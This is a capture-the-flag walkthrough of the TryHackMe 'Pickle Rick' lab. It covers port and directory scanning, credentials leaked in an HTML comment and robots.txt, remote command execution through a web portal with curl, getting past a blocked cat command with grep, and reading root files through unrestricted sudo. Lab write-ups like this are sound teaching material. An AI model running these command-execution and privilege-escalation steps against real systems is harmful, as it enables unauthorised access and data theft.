<div align="center">

# Pickle Rick

[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/picklerick)[![Category](https://img.shields.io/badge/Web-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/picklerick)[![Category](https://img.shields.io/badge/Privesc-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/picklerick)

</div> <br/>

## `./recon`

Port scan performed via nmap:

```bash
nmap -sT <ip>

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ports 22 (ssh) and 80 (http) found open

Checked the main page on port 80

```bash
curl <ip>
```

A username found in an HTML comment

```html
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

Attempted to connect via ssh with this username

```bash
ssh R1ckRul3s@<ip>

Permission denied (publickey).
```

Password login disabled, key-only access. Back to port 80

<br/>

## `./enum`

Ran gobuster to look for directories and files

```bash
gobuster dir -u http://<ip> --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x http,php

/assets               (Status: 301)
/clue.txt             (Status: 200)
/robots.txt           (Status: 200)
/portal.php           (Status: 302) [--> /login.php]
/login.php            (Status: 200)
```

Checked robots.txt

```bash
curl <ip>/robots.txt

Wubbalubbadubdub
```

The string looks like a password. login.php has a form with username and password fields

<br/>

## `./access`

Sent the credentials to login.php, cookie saved

```bash
curl -c cookies.txt -d "username=R1ckRul3s&password=Wubbalubbadubdub&sub=execute" http://<ip>/login.php
```

Requested portal.php with the cookie

```bash
curl -b cookies.txt http://<ip>/portal.php
```

The page has a form for running commands. Also found a base64 string in a comment

```
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```

After a few rounds of decoding it turned into "rabbit hole" — dead end. Back to the command form

<br/>

## `./command-panel`

Ran ls

```bash
curl -b cookies.txt -d "command=ls&sub=execute" http://<ip>/portal.php

Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Tried reading the file with cat

```bash
curl -b cookies.txt -d "command=cat%20Sup3rS3cretPickl3Ingred.txt&sub=execute" http://<ip>/portal.php

Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```

cat is disabled. Tried grep instead

```bash
curl -b cookies.txt -d "command=grep%20''%20Sup3rS3cretPickl3Ingred.txt&sub=execute" http://<ip>/portal.php
```

First ingredient captured!

<br/>

## `./environment`

```
whoami → www-data
pwd    → /var/www/html
```

Checked the filesystem root — standard set of system directories, nothing unusual

<br/>

## `./privesc`

Checked permissions with sudo -l

```bash
curl -b cookies.txt -d "command=sudo%20-l&sub=execute" http://<ip>/portal.php

User www-data may run the following commands on ip-10-129-134-109:
    (ALL) NOPASSWD: ALL
```

sudo access is unrestricted. Found 3rd.txt in /root, read via grep the same way as before. Second ingredient captured!

<br/>

## `./final-ingredient`

Found a directory in /home named after the second ingredient. Direct access to its contents didn't work. Read it recursively with grep

```bash
curl -b cookies.txt -d 'command=sudo grep -r "" /home/rick/"second"*&sub=execute' http://<ip>/portal.php
```

Third ingredient captured!